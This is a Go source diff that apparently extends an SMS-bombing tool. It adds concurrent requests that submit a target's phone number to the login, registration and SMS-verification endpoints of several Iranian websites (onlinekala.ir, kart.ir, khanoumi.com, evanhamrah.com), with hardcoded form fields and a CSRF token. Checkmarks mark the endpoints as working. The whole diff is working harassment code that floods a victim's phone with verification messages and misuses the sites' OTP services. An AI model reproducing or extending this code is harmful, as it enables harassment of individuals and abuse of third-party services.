@@ -494,6 +494,43 @@ cookieJar, _ := cookiejar.New(nil)
 
 
 
+// ------ https://www.onlinekala.ir ✅ 
+wg.Add(1)
+tasks <- func(c *http.Client) func() {
+    return func() {
+        formData := url.Values{}
+        formData.Set("back", "my-account")
+        formData.Set("username", phone)
+        formData.Set("id_customer", "")
+        formData.Set("firstname", "مانس")
+        formData.Set("lastname", "مین")
+        formData.Set("action", "register")
+        formData.Set("ajax", "1")
+        sendFormRequest(c, ctx, "https://www.onlinekala.ir/login?back=my-account", formData, &wg, ch)
+    }
+}(client)
+// ------ https:kart.ir ✅ 
+wg.Add(1)
+tasks <- func(c *http.Client) func() {
+    return func() {
+        payload := map[string]interface{}{
+            "username": phone,
+        }
+        sendJSONRequest(c, ctx, "https://kart.ir/api/auth/authenticate", payload, &wg, ch)
+    }
+}(client)
+
+// ------ https:khanoumi.com ✅ 
+wg.Add(1)
+tasks <- func(c *http.Client) func() {
+    return func() {
+        formData := url.Values{}
+        formData.Set("applicationId", "b92fdd0f-a44d-4fcc-a2db-6d955cce2f5e")
+        formData.Set("loginIdentifier", phone)
+        formData.Set("loginSchemeName", "sms")
+        sendFormRequest(c, ctx, "https://accounts.khanoumi.com/account/login/init", formData, &wg, ch)
+    }
+}(client)
 // --- evanhamrah.com  ✅ 
 wg.Add(1)
 tasks <- func(c *http.Client) func() {
@@ -514,7 +551,7 @@ tasks <- func(c *http.Client) func() {
         formData.Set("action", "digits_check_mob")
         formData.Set("countrycode", "+98")
         formData.Set("mobileNo", formatPhoneWithSpaces(phone))
-        formData.Set("csrf", "a6fd7f4d05") // ممکنه نیاز به آپدیت داشته باشه
+        formData.Set("csrf", "a6fd7f4d05") //check
         formData.Set("login", "2")
         formData.Set("username", "monsmain")
         formData.Set("email", "")
